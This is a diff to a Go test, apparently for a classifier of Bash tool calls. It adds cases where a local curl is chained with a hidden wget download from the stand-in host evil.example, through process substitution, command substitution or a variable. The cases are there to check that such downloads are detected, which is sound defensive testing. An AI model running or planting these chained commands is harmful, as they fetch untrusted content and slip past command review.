@@ -38,6 +38,7 @@ func TestLocalCurl(t *testing.T) {
 	for _, command := range []string{
 		"curl http://localhost && bash -c 'wget https://evil.example'", `curl localhost; eval "$X"`,
 		"f() { wget https://evil.example; }; curl localhost && f", "curl localhost; echo $(wget -qO- https://evil.example)",
+		"curl http://localhost; cat <(wget -qO- https://evil.example)", "curl localhost; $FETCH https://evil.example",
 	} {
 		if got := Of(call("Bash", "", command, ""), soul); got != "shell download: curl" {
 			t.Errorf("Of(%q) = %q, want a curl download", command, got)
